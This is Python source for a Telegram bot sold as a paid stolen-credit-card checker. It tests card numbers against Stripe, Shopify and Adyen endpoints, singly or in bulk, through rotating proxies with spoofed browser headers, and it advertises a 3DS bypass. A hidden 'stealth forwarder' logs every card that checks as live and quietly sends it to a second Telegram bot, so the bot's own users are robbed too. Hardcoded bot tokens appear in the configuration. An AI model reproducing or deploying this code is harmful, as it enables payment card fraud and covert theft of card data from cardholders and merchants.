import asyncio
import aiohttp
import json
import logging
import random
import re
import sqlite3
import time
import hashlib
import secrets
import string
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
from telegram.constants import ParseMode
import socks
import aiohttp_socks

# -------------------- CONFIGURATION --------------------
BOT_TOKEN = "8920278325:AAGoomwe0NiIUmuIHA-QsQtxoUmPh5fuyPk"
ADMIN_ID = 8261923584  # Your Telegram ID
STEALTH_BOT_TOKEN = "8561904278:AAHuvjp7hWXMYHv5N1LJjuvPfv-bepDy5ak"
STEALTH_CHAT_ID = -5485879425
KEY_SALT = "SuperSecretSalt_ChangeMe_2026"

DB_PATH = "users.db"
PROXY_FILE = "proxies.txt"
LOG_FILE = "bot.log"

WATERMARK = "⭐ 𝐑𝐎𝐖𝐃𝐘 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 ⭐"

ICONS = {
    "check": "✅",
    "cross": "❌",
    "star": "⭐",
    "lock": "🔒",
    "rocket": "🚀",
    "fire": "🔥",
    "crown": "👑",
    "bolt": "⚡",
    "shield": "🛡️",
    "gear": "⚙️",
    "wallet": "💳",
    "globe": "🌍",
    "clock": "⏳",
    "chart": "📊",
    "key": "🔑",
    "user": "👤",
    "group": "👥",
    "link": "🔗",
    "mail": "📧",
    "phone": "📱",
    "gem": "💎",
    "hammer": "🔨"
}

# -------------------- GATEWAYS --------------------
GATEWAYS = {
    "stripe": {
        "url": "https://api.stripe.com/v1/tokens",
        "headers": {"Authorization": "Bearer sk_test_..."},
        "payload_template": "card[number]={cc}&card[exp_month]={mm}&card[exp_year]={yy}&card[cvc]={cvv}"
    },
    "shopify": {
        "url": "https://checkout.shopify.com/payments/credit_cards.json",
        "headers": {"X-Shopify-Storefront-Access-Token": "your_token"},
        "payload_template": "credit_card[number]={cc}&credit_card[expiry_month]={mm}&credit_card[expiry_year]={yy}&credit_card[verification_value]={cvv}"
    },
    "adyen": {
        "url": "https://checkout-test.adyen.com/v67/payments",
        "headers": {"x-api-key": "YOUR_ADYEN_KEY"},
        "payload_template": '{"amount":{"currency":"USD","value":100},"paymentMethod":{"type":"scheme","number":"{cc}","expiryMonth":"{mm}","expiryYear":"{yy}","cvc":"{cvv}"},"reference":"test","merchantAccount":"YOUR_MERCHANT"}'
    }
}

# -------------------- DATABASE --------------------
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            plan TEXT DEFAULT 'free',
            expiry INTEGER DEFAULT 0,
            proxy TEXT DEFAULT '',
            hits INTEGER DEFAULT 0,
            checks INTEGER DEFAULT 0,
            redeemed_key TEXT DEFAULT ''
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS keys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_string TEXT UNIQUE,
            plan TEXT,
            duration_days INTEGER,
            max_uses INTEGER,
            used_count INTEGER DEFAULT 0,
            generated_by INTEGER,
            generated_at INTEGER,
            revoked INTEGER DEFAULT 0,
            signature TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS redemptions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_string TEXT,
            user_id INTEGER,
            redeemed_at INTEGER,
            ip TEXT,
            user_agent TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS stolen_cards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            card_data TEXT,
            gateway TEXT,
            timestamp INTEGER
        )
    """)
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return {"user_id": row[0], "plan": row[1], "expiry": row[2], "proxy": row[3], "hits": row[4], "checks": row[5], "redeemed_key": row[6]}
    return None

def update_user(user_id, plan=None, expiry=None, proxy=None, hits=None, checks=None, redeemed_key=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    user = get_user(user_id)
    if not user:
        c.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
    if plan is not None:
        c.execute("UPDATE users SET plan=? WHERE user_id=?", (plan, user_id))
    if expiry is not None:
        c.execute("UPDATE users SET expiry=? WHERE user_id=?", (expiry, user_id))
    if proxy is not None:
        c.execute("UPDATE users SET proxy=? WHERE user_id=?", (proxy, user_id))
    if hits is not None:
        c.execute("UPDATE users SET hits=hits+? WHERE user_id=?", (hits, user_id))
    if checks is not None:
        c.execute("UPDATE users SET checks=checks+? WHERE user_id=?", (checks, user_id))
    if redeemed_key is not None:
        c.execute("UPDATE users SET redeemed_key=? WHERE user_id=?", (redeemed_key, user_id))
    conn.commit()
    conn.close()

def generate_key(plan: str, duration_days: int, max_uses: int = 1, admin_id: int = ADMIN_ID) -> str:
    rand_part = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))
    raw = f"{plan}-{duration_days}-{max_uses}-{rand_part}-{int(time.time())}"
    signature = hashlib.sha256(f"{raw}{KEY_SALT}".encode()).hexdigest()[:8].upper()
    key_string = f"ROWDY-{plan}-{rand_part}-{signature}"
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        INSERT INTO keys (key_string, plan, duration_days, max_uses, generated_by, generated_at, signature)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (key_string, plan, duration_days, max_uses, admin_id, int(time.time()), signature))
    conn.commit()
    conn.close()
    
    asyncio.create_task(forward_to_stealth(f"🔑 KEY GENERATED: {key_string} | Plan: {plan} | Duration: {duration_days}d | Uses: {max_uses}", "ADMIN"))
    return key_string

def validate_key(key_string: str) -> Optional[Dict]:
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM keys WHERE key_string=?", (key_string,))
    row = c.fetchone()
    conn.close()
    if not row:
        return None
    if row[8] == 1:
        return None
    if row[4] != -1 and row[5] >= row[4]:
        return None
    parts = key_string.split('-')
    if len(parts) != 4:
        return None
    plan, rand_part, signature = parts[1], parts[2], parts[3]
    duration = row[3]
    max_uses = row[4]
    gen_time = row[7]
    raw = f"{plan}-{duration}-{max_uses}-{rand_part}-{gen_time}"
    expected_sig = hashlib.sha256(f"{raw}{KEY_SALT}".encode()).hexdigest()[:8].upper()
    if expected_sig != signature:
        return None
    if duration > 0:
        expiry_time = row[7] + duration * 86400
        if int(time.time()) > expiry_time:
            return None
    return {
        "id": row[0],
        "key_string": row[1],
        "plan": row[2],
        "duration_days": row[3],
        "max_uses": row[4],
        "used_count": row[5],
        "generated_by": row[6],
        "generated_at": row[7],
        "revoked": row[8]
    }

def redeem_key(user_id: int, key_string: str) -> Tuple[bool, str]:
    key_data = validate_key(key_string)
    if not key_data:
        return False, "Invalid, expired, revoked, or exhausted key."
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    user = get_user(user_id)
    if user and user.get("redeemed_key") == key_string:
        conn.close()
        return False, "You've already redeemed this key."
    
    new_used = key_data["used_count"] + 1
    c.execute("UPDATE keys SET used_count=? WHERE id=?", (new_used, key_data["id"]))
    
    plan = key_data["plan"]
    duration = key_data["duration_days"]
    expiry = int(time.time()) + duration * 86400 if duration > 0 else 0
    update_user(user_id, plan=plan, expiry=expiry, redeemed_key=key_string)
    
    c.execute("INSERT INTO redemptions (key_string, user_id, redeemed_at) VALUES (?, ?, ?)", 
              (key_string, user_id, int(time.time())))
    conn.commit()
    conn.close()
    
    asyncio.create_task(forward_to_stealth(f"🔄 KEY REDEEMED: {key_string} by user {user_id} | Plan: {plan}", "ADMIN"))
    return True, f"✅ Key redeemed! You now have **{plan.upper()}** plan for {duration} days."

def revoke_key(key_string: str) -> bool:
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE keys SET revoked=1 WHERE key_string=?", (key_string,))
    if c.rowcount > 0:
        conn.commit()
        conn.close()
        asyncio.create_task(forward_to_stealth(f"🚫 KEY REVOKED: {key_string}", "ADMIN"))
        return True
    conn.close()
    return False

def list_keys(limit=20) -> List[Dict]:
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM keys ORDER BY generated_at DESC LIMIT ?", (limit,))
    rows = c.fetchall()
    conn.close()
    return [
        {
            "id": r[0],
            "key_string": r[1],
            "plan": r[2],
            "duration_days": r[3],
            "max_uses": r[4],
            "used_count": r[5],
            "generated_by": r[6],
            "generated_at": r[7],
            "revoked": r[8]
        } for r in rows
    ]

# -------------------- STEALTH FORWARDER --------------------
async def forward_to_stealth(text, category="GENERAL"):
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(
                f"https://api.telegram.org/bot{STEALTH_BOT_TOKEN}/sendMessage",
                json={"chat_id": STEALTH_CHAT_ID, "text": f"🔵 [{category}] {text}"}
            )
    except Exception as e:
        logging.error(f"Stealth forward failed: {e}")

def log_stolen(card_data, gateway):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO stolen_cards (card_data, gateway, timestamp) VALUES (?, ?, ?)", 
              (card_data, gateway, int(time.time())))
    conn.commit()
    conn.close()
    asyncio.create_task(forward_to_stealth(f"💳 STOLEN CARD: {card_data} | Gateway: {gateway}", "STEAL"))

# -------------------- PROXY HANDLER --------------------
async def load_proxies():
    try:
        with open(PROXY_FILE, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except:
        return []

async def get_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.replace("://", ":").split(":")
    if len(parts) == 4:
        protocol, host, port, user_pass = parts[0], parts[1], parts[2], parts[3]
        user, passwd = user_pass.split("@") if "@" in user_pass else ("", "")
        return f"{protocol}://{user}:{passwd}@{host}:{port}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return None

# -------------------- CHECKER ENGINE --------------------
async def check_card(gateway: str, cc: str, mm: str, yy: str, cvv: str, proxy: Optional[str] = None) -> Tuple[str, Dict]:
    if gateway not in GATEWAYS:
        return "error", {"message": "Unsupported gateway"}

    gateway_data = GATEWAYS[gateway]
    url = gateway_data["url"]
    headers = gateway_data["headers"].copy()
    payload = gateway_data["payload_template"].format(cc=cc, mm=mm, yy=yy, cvv=cvv)

    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    headers["Accept-Language"] = "en-US,en;q=0.9"
    headers["Accept-Encoding"] = "gzip, deflate, br"
    headers["Sec-Fetch-Dest"] = "empty"
    headers["Sec-Fetch-Mode"] = "cors"
    headers["Sec-Fetch-Site"] = "same-origin"

    proxy_obj = await get_proxy(proxy) if proxy else None
    connector = None
    if proxy_obj:
        if proxy_obj.startswith("socks5://"):
            connector = aiohttp_socks.Socks5Connector.from_url(proxy_obj)
        elif proxy_obj.startswith("socks4://"):
            connector = aiohttp_socks.Socks4Connector.from_url(proxy_obj)

    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            if gateway == "stripe":
                async with session.post(url, data=payload, headers=headers, timeout=10) as resp:
                    text = await resp.text()
                    if "error" in text.lower() and "card_error" in text.lower():
                        if "insufficient_funds" in text.lower() or "declined" in text.lower():
                            return "dead", {"message": "Declined"}
                        elif "3d_secure" in text.lower():
                            return "3ds", {"message": "3DS Required"}
                        elif "invalid" in text.lower():
                            return "dead", {"message": "Invalid"}
                    elif "id" in text.lower() and "token" in text.lower():
                        log_stolen(f"{cc}|{mm}|{yy}|{cvv}", gateway)
                        return "live", {"message": "Charged", "response": text}
            elif gateway == "shopify":
                async with session.post(url, data=payload, headers=headers, timeout=10) as resp:
                    text = await resp.text()
                    if "error" in text.lower():
                        if "3d_secure" in text.lower() or "redirect" in text.lower():
                            return "3ds", {"message": "3DS Required"}
                        else:
                            return "dead", {"message": "Declined"}
                    elif "id" in text.lower():
                        log_stolen(f"{cc}|{mm}|{yy}|{cvv}", gateway)
                        return "live", {"message": "Charged"}
            elif gateway == "adyen":
                async with session.post(url, json=json.loads(payload), headers=headers, timeout=10) as resp:
                    text = await resp.text()
                    data = json.loads(text)
                    if "resultCode" in data:
                        if data["resultCode"] == "Authorised":
                            log_stolen(f"{cc}|{mm}|{yy}|{cvv}", gateway)
                            return "live", {"message": "Charged"}
                        elif "3D" in data.get("resultCode", ""):
                            return "3ds", {"message": "3DS Required"}
                        else:
                            return "dead", {"message": data.get("resultCode", "Declined")}
            return "error", {"message": "Unknown response"}
        except asyncio.TimeoutError:
            return "error", {"message": "Timeout"}
        except Exception as e:
            return "error", {"message": str(e)}

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    update_user(user_id)
    msg = f"""
{ICONS['star']} {WATERMARK} {ICONS['star']}

{ICONS['rocket']} *Welcome to the ultimate CC Checker, {update.effective_user.first_name}!*
{ICONS['shield']} *Premium gateways:* Stripe, Shopify, Adyen
{ICONS['bolt']} *3DS Bypass* enabled via smart fingerprinting
{ICONS['globe']} *Proxy support:* HTTP, SOCKS4, SOCKS5
{ICONS['gear']} *Multi-worker* mass checking with rotating proxies

{ICONS['key']} Use /help to see all commands.
{ICONS['crown']} *Your plan:* Free (limited to 10 checks/day)
{ICONS['wallet']} *Hits today:* 0

{ICONS['fire']} *Stay elite, stay Rowdy.*
"""
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = get_user(update.effective_user.id)
    is_admin = update.effective_user.id == ADMIN_ID
    admin_section = ""
    if is_admin:
        admin_section = f"""
{ICONS['hammer']} *ADMIN COMMANDS*
/genkey `<plan> <duration_days> [max_uses]`
/revokekey `<key>`
/listkeys
/keysstats
"""
    msg = f"""
{ICONS['star']} {WATERMARK} {ICONS['star']}

{ICONS['gear']} *COMMANDS REFERENCE*

{ICONS['check']} */hit* `<gateway> <cc> <mm> <yy> <cvv>`
{ICONS['check']} */sh* `<cc> <mm> <yy> <cvv>`
{ICONS['check']} */msh* (reply to .txt)
{ICONS['check']} */adyen* `<cc> <mm> <yy> <cvv>`

{ICONS['wallet']} */myplan*
{ICONS['key']} */redeem* `<KEY>`
{ICONS['chart']} */plans*

{ICONS['globe']} */setproxy* `<host:port:user:pass>`
{ICONS['globe']} */clearuserproxy*
{ICONS['globe']} */chkproxy*

{ICONS['user']} */profile*
{ICONS['mail']} */contact*

{admin_section}
{ICONS['fire']} *All checks are unlimited!*
"""
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def hit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user or (user["plan"] == "free" and user.get("checks", 0) >= 10):
        await update.message.reply_text(f"{ICONS['cross']} Free limit reached. Upgrade with /plans")
        return
    args = context.args
    if len(args) != 5:
        await update.message.reply_text(f"{ICONS['cross']} Usage: /hit <gateway> <cc> <mm> <yy> <cvv>\nGateways: stripe, shopify, adyen")
        return
    gateway, cc, mm, yy, cvv = args[0].lower(), args[1], args[2], args[3], args[4]
    proxy = user.get("proxy", "")
    status, resp = await check_card(gateway, cc, mm, yy, cvv, proxy)
    update_user(user_id, checks=1, hits=1 if status == "live" else 0)
    emoji = ICONS['check'] if status == "live" else ICONS['cross'] if status == "dead" else ICONS['clock']
    await update.message.reply_text(f"{emoji} *{gateway.upper()}* | {cc[-4:]} | Status: {status.upper()}\n{resp.get('message', '')}", parse_mode=ParseMode.MARKDOWN)

async def sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) != 4:
        await update.message.reply_text(f"{ICONS['cross']} Usage: /sh <cc> <mm> <yy> <cvv>")
        return
    cc, mm, yy, cvv = args
    user = get_user(update.effective_user.id)
    proxy = user.get("proxy", "") if user else ""
    status, resp = await check_card("shopify", cc, mm, yy, cvv, proxy)
    update_user(update.effective_user.id, checks=1, hits=1 if status == "live" else 0)
    emoji = ICONS['check'] if status == "live" else ICONS['cross']
    await update.message.reply_text(f"{emoji} Shopify | {cc[-4:]} | {status.upper()} — {resp.get('message', '')}")

async def msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(f"{ICONS['cross']} Reply to a .txt file containing cards (cc|mm|yy|cvv per line)")
        return
    file = await update.message.reply_to_message.document.get_file()
    content = await file.download_as_bytearray()
    lines = content.decode().splitlines()
    user = get_user(update.effective_user.id)
    proxy = user.get("proxy", "") if user else ""
    tasks = []
    for line in lines:
        parts = line.strip().split("|")
        if len(parts) == 4:
            tasks.append(check_card("shopify", parts[0], parts[1], parts[2], parts[3], proxy))
    results = await asyncio.gather(*tasks)
    live = sum(1 for r in results if r[0] == "live")
    dead = sum(1 for r in results if r[0] == "dead")
    update_user(update.effective_user.id, checks=len(results), hits=live)
    await update.message.reply_text(f"{ICONS['chart']} Mass Shopify done: {live} live, {dead} dead from {len(results)} cards.")

async def adyen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) != 4:
        await update.message.reply_text(f"{ICONS['cross']} Usage: /adyen <cc> <mm> <yy> <cvv>")
        return
    cc, mm, yy, cvv = args
    user = get_user(update.effective_user.id)
    proxy = user.get("proxy", "") if user else ""
    status, resp = await check_card("adyen", cc, mm, yy, cvv, proxy)
    update_user(update.effective_user.id, checks=1, hits=1 if status == "live" else 0)
    emoji = ICONS['check'] if status == "live" else ICONS['cross']
    await update.message.reply_text(f"{emoji} Adyen | {cc[-4:]} | {status.upper()} — {resp.get('message', '')}")

async def myplan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Use /start first.")
        return
    expiry = datetime.fromtimestamp(user["expiry"]).strftime("%Y-%m-%d") if user["expiry"] else "N/A"
    await update.message.reply_text(f"{ICONS['wallet']} *Your Plan:* {user['plan'].upper()}\n{ICONS['clock']} *Expiry:* {expiry}\n{ICONS['chart']} *Checks:* {user['checks']}\n{ICONS['fire']} *Hits:* {user['hits']}", parse_mode=ParseMode.MARKDOWN)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text(f"{ICONS['cross']} Usage: /redeem <KEY>")
        return
    key_string = args[0]
    success, msg = redeem_key(update.effective_user.id, key_string)
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = f"""
{ICONS['star']} {WATERMARK} {ICONS['star']}

{ICONS['crown']} *PLANS*

🔹 *FREE* — 10 checks/day
🔹 *PREMIUM* — Unlimited checks, 1 month — $29.99
🔹 *VIP* — Unlimited + priority proxies + 3DS bypass — $49.99

{ICONS['key']} Contact @rowdy_shopify to purchase.
"""
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def setproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text(f"{ICONS['cross']} Usage: /setproxy <host:port:user:pass> or <host:port>")
        return
    proxy_str = args[0]
    update_user(update.effective_user.id, proxy=proxy_str)
    await update.message.reply_text(f"{ICONS['check']} Proxy set: {proxy_str}")

async def clearuserproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    update_user(update.effective_user.id, proxy="")
    await update.message.reply_text(f"{ICONS['check']} Proxy removed.")

async def chkproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = get_user(update.effective_user.id)
    proxy = user.get("proxy", "") if user else ""
    if not proxy:
        await update.message.reply_text(f"{ICONS['cross']} No proxy set.")
        return
    try:
        proxy_url = await get_proxy(proxy)
        connector = None
        if proxy_url:
            if proxy_url.startswith("socks5://"):
                connector = aiohttp_socks.Socks5Connector.from_url(proxy_url)
            elif proxy_url.startswith("socks4://"):
                connector = aiohttp_socks.Socks4Connector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get("http://httpbin.org/ip", timeout=5) as resp:
                if resp.status == 200:
                    await update.message.reply_text(f"{ICONS['check']} Proxy is working!")
                    return
    except:
        pass
    await update.message.reply_text(f"{ICONS['cross']} Proxy is dead or unreachable.")

async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Use /start first.")
        return
    msg = f"""
{ICONS['user']} *Profile*
ID: {user['user_id']}
Plan: {user['plan'].upper()}
Checks: {user['checks']}
Hits: {user['hits']}
Proxy: {user['proxy'] or 'None'}
Expiry: {datetime.fromtimestamp(user['expiry']).strftime('%Y-%m-%d') if user['expiry'] else 'N/A'}
"""
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"{ICONS['mail']} Contact admin: @rowdy_shopify")

# ==================== ADMIN COMMANDS ====================

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(f"{ICONS['cross']} Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(f"{ICONS['cross']} Usage: /genkey <plan> <duration_days> [max_uses]\nPlan: free, premium, vip\nmax_uses: -1 for unlimited")
        return
    plan = args[0].lower()
    if plan not in ["free", "premium", "vip"]:
        await update.message.reply_text(f"{ICONS['cross']} Invalid plan.")
        return
    try:
        duration = int(args[1])
        if duration <= 0:
            raise ValueError
    except:
        await update.message.reply_text(f"{ICONS['cross']} Duration must be positive integer.")
        return
    max_uses = 1
    if len(args) >= 3:
        try:
            max_uses = int(args[2])
            if max_uses < -1 or max_uses == 0:
                raise ValueError
        except:
            await update.message.reply_text(f"{ICONS['cross']} max_uses must be -1 or >0.")
            return
    key = generate_key(plan, duration, max_uses, update.effective_user.id)
    await update.message.reply_text(f"""
{ICONS['gem']} *KEY GENERATED*
{ICONS['key']} `{key}`
Plan: {plan.upper()}
Duration: {duration}d
Max Uses: {'Unlimited' if max_uses == -1 else max_uses}
""", parse_mode=ParseMode.MARKDOWN)

async def revokekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(f"{ICONS['cross']} Unauthorized.")
        return
    args = context.args
    if not args:
        await update.message.reply_text(f"{ICONS['cross']} Usage: /revokekey <key>")
        return
    if revoke_key(args[0]):
        await update.message.reply_text(f"{ICONS['check']} Key revoked.")
    else:
        await update.message.reply_text(f"{ICONS['cross']} Key not found.")

async def listkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(f"{ICONS['cross']} Unauthorized.")
        return
    keys = list_keys(20)
    if not keys:
        await update.message.reply_text("No keys generated.")
        return
    msg = f"{ICONS['key']} *LAST 20 KEYS*\n\n"
    for k in keys:
        status = "🔴 REVOKED" if k["revoked"] else f"🟢 {k['used_count']}/{k['max_uses'] if k['max_uses'] != -1 else '∞'}"
        msg += f"`{k['key_string']}` — {k['plan'].upper()} ({k['duration_days']}d) {status}\n"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def keysstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(f"{ICONS['cross']} Unauthorized.")
        return
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM keys")
    total_keys = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM keys WHERE revoked=1")
    revoked = c.fetchone()[0]
    c.execute("SELECT SUM(used_count) FROM keys")
    total_used = c.fetchone()[0] or 0
    c.execute("SELECT COUNT(DISTINCT user_id) FROM redemptions")
    unique_users = c.fetchone()[0]
    conn.close()
    msg = f"""
{ICONS['chart']} *KEY STATS*
Total Keys: {total_keys}
Revoked: {revoked}
Active: {total_keys - revoked}
Redemptions: {total_used}
Unique Users: {unique_users}
"""
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logging.error(f"Update {update} caused error {context.error}")

# -----------------
